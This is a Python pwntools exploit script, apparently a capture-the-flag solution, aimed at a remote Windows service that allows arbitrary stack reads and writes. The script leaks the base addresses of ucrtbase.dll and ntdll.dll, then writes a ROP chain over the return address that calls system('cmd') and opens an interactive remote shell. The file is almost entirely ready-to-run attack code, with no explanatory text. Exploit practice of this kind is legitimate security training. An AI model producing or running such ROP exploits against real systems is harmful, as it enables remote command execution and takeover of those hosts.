from pwn import *


RET_ADDR_OFFSET = 8  # position relative to 'val' stack variable


def recv_line(p, n=0) -> str:
    if n == 0:
        return p.recvline().decode().strip()
    return p.recvn(n).decode().strip()


def read_stack(p, pos) -> int:
    recv_line(p)  # Do
    p.sendline(b'r')  # read
    recv_line(p, len('pos: '))
    p.sendline(f'{pos}'.encode())
    stack_var = recv_line(p)
    stack_var = ''.join([c for c in stack_var if c.isdigit() or c == '-'])
    return int(stack_var)


def write_stack(p, pos, val):
    recv_line(p)  # Do
    p.sendline(b'w')
    recv_line(p, len('pos: '))
    p.sendline(f'{pos}'.encode())  # position relative to 'val' stack variable
    recv_line(p, len('val: '))
    p.sendline(f'{val}'.encode())


def main():
    p = remote('<ip>', 4444)
    recv_line(p)  # Hello-World

    # [rsp - 0x3C0] = [rsp - (5 * 8) - (115 * 8)] = ptr[-120]
    ucrtbasedll_base_addr = read_stack(p, -120) - 0x36 - 0xff70
    print(f'ucrtbase.dll base address: 0x{ucrtbasedll_base_addr:x}')

    # [rsp + 0xD8] = [rsp + (5 * 8) + (22 * 8)] = ptr[22]
    ntdll_base_addr = read_stack(p, 22) - 0x2B - 0x7e3e0
    print(f'ntdll.dll base address: 0x{ntdll_base_addr:x}')

    # rsp when reached ret in main
    stack_addr = read_stack(p, -27) - 0x20 + 0x68
    print(f'stack address on return: 0x{stack_addr:x}')

    ntdll_pop_rop_addr = ntdll_base_addr + 0x8e1c0
    ucrtbasedll_system_addr = ucrtbasedll_base_addr + 0xbcad0

    STACK_ROP_CHAIN = [
        ntdll_pop_rop_addr,                                       # pop rdx ; pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
        0x0,                                                      # param_2_rdx
        'cmd_name_ptr',                                           # param_1_rcx
        0x0,                                                      # param_3_r8
        0x0,                                                      # param_4_r9
        0x0,                                                      # junk
        0x0,                                                      # junk

        ucrtbasedll_system_addr,                                  # system
        0x0,                                                      # return address, we don't care anyway

        'cmd_name',
    ]

    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('cmd_name_ptr')] = stack_addr + 8 * STACK_ROP_CHAIN.index('cmd_name')
    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('cmd_name')] = int.from_bytes(reversed(b'cmd'.ljust(8, b'\x00')), 'big')

    for j, s in enumerate(STACK_ROP_CHAIN):
        # print(f'{j}: {s}')
        write_stack(p, RET_ADDR_OFFSET + j, s)

    recv_line(p)  # Do
    p.sendline(b'x')  # start rop chain

    p.interactive()


if __name__ == '__main__':
    main()


